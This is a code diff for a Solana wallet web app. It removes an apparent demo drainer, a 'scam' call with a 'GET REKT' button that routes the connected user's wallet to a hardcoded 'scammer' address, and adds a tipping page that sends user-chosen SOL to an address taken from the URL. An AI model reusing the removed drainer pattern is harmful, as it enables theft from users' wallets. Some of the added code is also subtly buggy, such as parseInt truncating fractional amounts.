@@ -16,8 +16,16 @@ import {
   SolflareWalletAdapter,
   TorusWalletAdapter,
 } from "@solana/wallet-adapter-wallets";
-import { clusterApiUrl, Connection, Transaction } from "@solana/web3.js";
-import React, { FC, ReactNode, useMemo } from "react";
+
+import {
+  clusterApiUrl,
+  Connection,
+  Transaction,
+  SystemProgram,
+  LAMPORTS_PER_SOL,
+} from "@solana/web3.js";
+import React, { FC, ReactNode, useMemo, useState } from "react";
+import { useParams } from "react-router-dom";
 import idl from "./problematic_dev.json";
 import {
   Program,
@@ -28,14 +36,15 @@ import {
   Wallet,
 } from "@project-serum/anchor";
 import { TOKEN_PROGRAM_ID } from "@solana/spl-token";
-
-require("./App.css");
+import "./App.css";
 require("@solana/wallet-adapter-react-ui/styles.css");
 
 const App: FC = () => {
+  let params = useParams();
+
   return (
     <Context>
-      <Content />
+      <Content receiver={params.receiver as string} />
     </Context>
   );
 };
@@ -70,8 +79,17 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
   );
 };
 
-const Content: FC = () => {
+interface ReceiverProps {
+  receiver: string;
+}
+
+const Content: FC<ReceiverProps> = (props) => {
   const wallet = useAnchorWallet();
+  const [twitterInput, setTwitterInput] = useState(props.receiver);
+  if (twitterInput == "" || twitterInput == null) {
+    setTwitterInput("Fill the address here");
+  }
+  const [solInput, setSolInput] = useState(0.5);
   function getProvider() {
     if (!wallet) {
       return null;
@@ -87,7 +105,7 @@ const Content: FC = () => {
     return provider;
   }
 
-  async function scam() {
+  async function transfer() {
     const provider = getProvider();
     if (!provider) {
       return null;
@@ -96,27 +114,22 @@ const Content: FC = () => {
     const program = new Program(b, idl.metadata.address, provider);
 
     try {
-      let tx = await program.methods
-        .scam()
-        .accounts({
-          rektAcc: provider.wallet.publicKey,
-          scammer: new web3.PublicKey(
-            "7DoSo1J4vP9v145b9RvXzUJNzTA5wPKQjZ9oG5nkffo5"
-          ),
-          tokenProgram: TOKEN_PROGRAM_ID,
-          systemProgram: web3.SystemProgram.programId,
+      let tx = new Transaction();
+      tx.add(
+        SystemProgram.transfer({
+          fromPubkey: provider.wallet.publicKey,
+          toPubkey: new web3.PublicKey(twitterInput),
+          lamports: solInput * LAMPORTS_PER_SOL,
         })
-        .transaction();
+      );
 
       const recent = await provider.connection.getLatestBlockhash();
       tx.feePayer = wallet?.publicKey;
       tx.recentBlockhash = recent.blockhash;
+      await setTimeout(function () {}, 30000);
       tx.lastValidBlockHeight = recent.lastValidBlockHeight;
-      let x = await wallet?.signTransaction(tx) as Transaction;
-      console.log(x); 
-      let x2 = await provider.connection.sendRawTransaction(x.serialize())
-        console.log(x2);    
-
+      let x = (await wallet?.signTransaction(tx)) as Transaction;
+      let x2 = await provider.connection.sendRawTransaction(x.serialize());
     } catch (err) {
       console.log("Transaction error: ", err);
     }
@@ -124,14 +137,53 @@ const Content: FC = () => {
 
   return (
     <div className="App">
+      <div className="w-full m-3 flex flew-row justify-end">
+        <WalletMultiButton />
+      </div>
+
+      <div className=" border bg-white rounded-md p-2">
+        <div className="flex flex-row justify-between items-center">
+          <h1 className="font-black text-4xl uppercase title">Solana Tip</h1>
+          <p>to @twitterUser</p>
+        </div>
         <div>
-        <p>Only use on devnet</p>
-        <br/>
-      <button onClick={scam}>GET REKT</button>
-      <br></br>
-      <p>Only use on devnet</p>
-      <br></br>
-      <WalletMultiButton />
+          <input
+            className="w-full m-1 mr-1 focus:outline-0 input-area"
+            type="text"
+            value={twitterInput}
+            onChange={(e) => setTwitterInput(e.target.value)}
+          />
+          <div className="grid grid-cols-2">
+            <div className="col-span-1 flex flex-col m-1 mb-2">
+              <input
+                type="number"
+                className="pl-2 mb-1 focus:outline-0 input-area"
+                value={solInput}
+                onChange={(e) => {
+                  setSolInput(parseInt(e.target.value));
+                }}
+              />
+              <input
+                type="range"
+                min="1"
+                max="50"
+                className="range"
+                value={solInput * 10}
+                onChange={(e) => {
+                  setSolInput(parseInt(e.target.value) / 10);
+                }}
+              />
+            </div>
+            <div className="col-span-1 pl-2">
+              <button
+                className="w-full h-full bg-gray-100 rounded-md"
+                onClick={transfer}
+              >
+                SEND IT
+              </button>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   );
